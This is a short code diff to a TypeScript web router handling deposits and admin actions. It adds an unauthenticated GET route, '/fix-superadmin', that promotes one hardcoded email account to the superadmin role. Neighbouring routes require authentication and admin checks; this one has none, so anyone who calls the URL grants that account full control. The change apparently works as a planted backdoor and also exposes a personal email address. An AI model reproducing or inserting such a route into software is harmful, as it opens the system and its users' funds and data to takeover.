@@ -327,4 +327,21 @@ router.post('/deposits/manual', authenticate, requireAdmin, async (req: Request,
   }
 })
 
+// FIX SUPERADMIN
+router.get('/fix-superadmin', async (req: Request, res: Response) => {
+  try {
+    const user = await User.findOneAndUpdate(
+      { email: 'manuelrye22@gmail.com' },
+      { role: 'superadmin' },
+      { new: true }
+    )
+    if (!user) {
+      return res.status(404).json({ message: 'User not found' })
+    }
+    res.json({ message: 'Fixed!', role: user.role })
+  } catch (error) {
+    res.status(500).json({ message: 'Failed' })
+  }
+})
+
 export default router
